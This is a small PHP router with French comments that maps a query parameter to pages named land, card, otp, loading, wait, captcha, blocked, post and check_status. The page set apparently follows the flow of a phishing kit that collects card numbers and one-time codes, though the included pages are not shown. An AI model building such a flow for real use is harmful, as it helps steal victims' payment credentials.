<?php

// Routes disponibles
$routes = [
    '1' => 'home/land.php',
    '2' => 'home/card.php',
    '3' => 'home/otp.php',
    '4' => 'home/loading.php',
    '5' => 'home/wait.php',
    '6' => 'home/exit.php',
    'v' => 'home/captcha.php',
    'e' => 'home/blocked.php',
    'p' => 'home/post.php',
    'c' => 'home/check_status.php',
];

// Obtenir la page demandée
$page = $_GET['s'] ?? '1';

// Vérifier si la route existe
if (isset($routes[$page])) {
    $file = __DIR__ . '/' . $routes[$page];
    if (file_exists($file)) {
        include $file;
        exit;
    }
}

// Par défaut, page d'accueil
include __DIR__ . '/home/land.php';
?>
